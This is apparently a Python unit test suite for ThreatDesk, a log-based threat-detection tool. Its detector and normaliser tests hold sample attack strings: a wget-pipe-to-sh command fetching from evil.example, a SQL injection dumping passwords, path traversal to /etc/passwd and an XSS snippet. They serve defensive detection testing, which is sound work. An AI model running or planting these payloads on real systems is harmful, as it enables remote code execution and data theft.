"""Comprehensive unit test suite for ThreatDesk.

Covers:
1. LineParser edge cases: empty lines, malformed lines, partial parses, mixed formats
2. Normalizer safety: multi-pass decode loop safety, no crash on invalid encoding
3. Detector rule precision: command-injection precision fix, SQLi, XSS, traversal
4. Correlator sliding window logic: brute-force, enumeration, multi-signature attacker
5. Severity resolution logic
6. SQLite Storage CRUD and persistence round trips
7. Threat Intel & IOC matching
8. Blocklist management
"""

from __future__ import annotations

import unittest
from datetime import datetime, timezone

from app.core.correlator import CorrelationEngine
from app.core.detector import RuleEngine
from app.core.normalizer import normalize_events, normalize_payload
from app.core.parser import (
    ParserRegistry,
)
from app.core.severity import resolve_severity
from app.core.threat_intel import ThreatIntelEngine
from app.models.detection import (
    IOC,
    BlocklistEntry,
    DetectionResult,
    IOCType,
)
from app.models.event import LogEvent, ParseQuality
from app.models.rule import DetectionMethod, DetectionRule, RuleCategory, Severity
from app.rules.default_rules import get_default_rules
from app.storage.database import Database
from app.storage.repositories import (
    BlocklistRepo,
    IOCRepo,
    RuleRepo,
)


class TestParser(unittest.TestCase):
    def setUp(self):
        self.registry = ParserRegistry()

    def test_apache_combined_parsing(self):
        line = '1.2.3.4 - - [02/Nov/2025:12:01:02 +0530] "GET /index.php?id=1 HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
        ev = self.registry.parse_line(line, 1, "test.log")
        self.assertEqual(ev.source_ip, "1.2.3.4")
        self.assertEqual(ev.status_code, "200")
        self.assertEqual(ev.parse_quality, ParseQuality.FULL)
        self.assertEqual(ev.parser_used, "apache_combined")

    def test_auth_log_parsing(self):
        line = "401 Unauthorised 49.99.13.16 admin 2019-03-21T21:08:15 /login"
        ev = self.registry.parse_line(line, 2, "auth.log")
        self.assertEqual(ev.source_ip, "49.99.13.16")
        self.assertEqual(ev.username, "admin")
        self.assertEqual(ev.status_code, "401")
        self.assertEqual(ev.parse_quality, ParseQuality.FULL)

    def test_fallback_unparsed_line(self):
        line = "Malformed log line without standard structure or recognizable fields"
        ev = self.registry.parse_line(line, 3, "unknown.log")
        self.assertIsNotNone(ev)
        self.assertEqual(ev.raw_line, line)
        self.assertEqual(ev.line_number, 3)

    def test_empty_line_handling(self):
        ev = self.registry.parse_line("", 4, "empty.log")
        self.assertEqual(ev.raw_line, "")
        self.assertEqual(ev.line_number, 4)


class TestNormalizer(unittest.TestCase):
    def test_repeated_url_decode(self):
        # Double encoded: %252e%252e%252f -> %2e%2e%2f -> ../
        raw = "%252e%252e%252fetc%252fpasswd"
        norm = normalize_payload(raw)
        self.assertIn("../etc/passwd", norm)

    def test_html_unescape(self):
        raw = "&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;"
        norm = normalize_payload(raw)
        self.assertEqual(norm, '<script>alert("xss")</script>')

    def test_normalizer_safety_and_preservation(self):
        ev = LogEvent(
            line_number=1,
            raw_line="raw-line-content",
            source_file="file.log",
            request="GET /%2e%2e/%2e%2e/etc/passwd HTTP/1.1",
        )
        normalize_events([ev])
        self.assertEqual(ev.raw_line, "raw-line-content")  # Never mutated
        self.assertIn("../../etc/passwd", ev.normalized_request)


class TestDetector(unittest.TestCase):
    def setUp(self):
        self.rules = get_default_rules()
        self.engine = RuleEngine(self.rules)

    def test_command_injection_precision(self):
        # SQL comment semicolon must NOT trigger command-injection
        ev_sqli = LogEvent(
            line_number=1,
            raw_line='1.2.3.4 - - [02/Nov/2025:12:01:02 +0530] "GET /index.php?id=1 UNION SELECT password FROM users;-- HTTP/1.1" 200 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"',
            source_file="test.log",
            request="GET /index.php?id=1 UNION SELECT password FROM users;-- HTTP/1.1",
            source_ip="1.2.3.4",
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        )
        normalize_events([ev_sqli])
        dets = self.engine.detect_event(ev_sqli)
        rule_ids = [d.rule_id for d in dets]
        self.assertIn("sql-injection", rule_ids)
        self.assertNotIn("command-injection", rule_ids)

        # Genuine shell injection MUST trigger command-injection
        ev_cmd = LogEvent(
            line_number=2,
            raw_line='12.12.12.12 - - [02/Nov/2025:12:01:25 +0530] "GET /api?cmd=;wget http://evil.example/payload.sh -O -|sh HTTP/1.1" 200 55 "-" "Wget/1.20.3"',
            source_file="test.log",
            request="GET /api?cmd=;wget http://evil.example/payload.sh -O -|sh HTTP/1.1",
            source_ip="12.12.12.12",
        )
        normalize_events([ev_cmd])
        dets_cmd = self.engine.detect_event(ev_cmd)
        cmd_rules = [d.rule_id for d in dets_cmd]
        self.assertIn("command-injection", cmd_rules)


class TestCorrelatorAndSeverity(unittest.TestCase):
    def setUp(self):
        self.correlator = CorrelationEngine(brute_force_threshold=3)

    def test_brute_force_correlation(self):
        events = [
            LogEvent(
                line_number=1,
                raw_line="",
                source_file="",
                source_ip="192.168.1.100",
                status_code="401",
                username="admin",
                timestamp="2025-01-01T12:00:00",
            ),
            LogEvent(
                line_number=2,
                raw_line="",
                source_file="",
                source_ip="192.168.1.100",
                status_code="401",
                username="root",
                timestamp="2025-01-01T12:00:10",
            ),
            LogEvent(
                line_number=3,
                raw_line="",
                source_file="",
                source_ip="192.168.1.100",
                status_code="401",
                username="guest",
                timestamp="2025-01-01T12:00:20",
            ),
        ]
        # Low severity base detections
        sig_dets = [
            DetectionResult(
                event=e,
                rule_id="failed-login",
                rule_name="Failed Login",
                category="Authentication",
                severity=Severity.LOW,
                confidence=60,
                method=DetectionMethod.SIGNATURE,
                matched_snippet="401",
            )
            for e in events
        ]
        beh_dets = self.correlator.correlate(events, sig_dets)
        self.assertEqual(len(beh_dets), 1)
        self.assertEqual(beh_dets[0].rule_id, "behavioral-brute-force")
        self.assertEqual(beh_dets[0].severity, Severity.CRITICAL)

        # Severity escalation check: low signature gets escalated to HIGH
        escalated_sev = resolve_severity(sig_dets[0], beh_dets)
        self.assertEqual(escalated_sev, Severity.HIGH)


class TestStorageAndRepos(unittest.TestCase):
    def setUp(self):
        self.db = Database(":memory:")
        self.rule_repo = RuleRepo(self.db)
        self.ioc_repo = IOCRepo(self.db)
        self.blocklist_repo = BlocklistRepo(self.db)

    def test_custom_rule_persistence(self):
        rule = DetectionRule(
            rule_id="custom-test-1",
            name="Custom Test Rule",
            category=RuleCategory.INJECTION,
            description="Testing custom rules",
            pattern=r"test-payload",
            severity=Severity.HIGH,
            confidence=90,
            is_builtin=False,
        )
        self.rule_repo.save_rule(rule)
        reloaded = self.rule_repo.get_rule("custom-test-1")
        self.assertIsNotNone(reloaded)
        self.assertEqual(reloaded.name, "Custom Test Rule")
        self.assertFalse(reloaded.is_builtin)

        # Delete custom rule
        deleted = self.rule_repo.delete_rule("custom-test-1")
        self.assertTrue(deleted)
        self.assertIsNone(self.rule_repo.get_rule("custom-test-1"))

    def test_ioc_matching(self):
        now = datetime.now(timezone.utc)
        ioc = IOC(
            ioc_id="ioc-1",
            indicator="198.51.100.44",
            ioc_type=IOCType.IP,
            severity=Severity.CRITICAL,
            confidence=95,
            source="ThreatFeed",
            first_seen=now,
            last_seen=now,
        )
        self.ioc_repo.save_ioc(ioc)

        engine = ThreatIntelEngine(self.ioc_repo)
        ev = LogEvent(
            line_number=1,
            raw_line="sample",
            source_file="sample.log",
            source_ip="198.51.100.44",
        )
        matches = engine.match_event(ev)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].ioc.indicator, "198.51.100.44")

    def test_blocklist_crud(self):
        now = datetime.now(timezone.utc)
        entry = BlocklistEntry(
            ip="203.0.113.5",
            reason="Repeated SQLi",
            confidence=90,
            added_at=now,
        )
        self.blocklist_repo.add_entry(entry)
        self.assertTrue(self.blocklist_repo.is_blocked("203.0.113.5"))
        self.assertFalse(self.blocklist_repo.is_blocked("1.1.1.1"))

        self.blocklist_repo.remove_entry("203.0.113.5")
        self.assertFalse(self.blocklist_repo.is_blocked("203.0.113.5"))


if __name__ == "__main__":
    unittest.main()
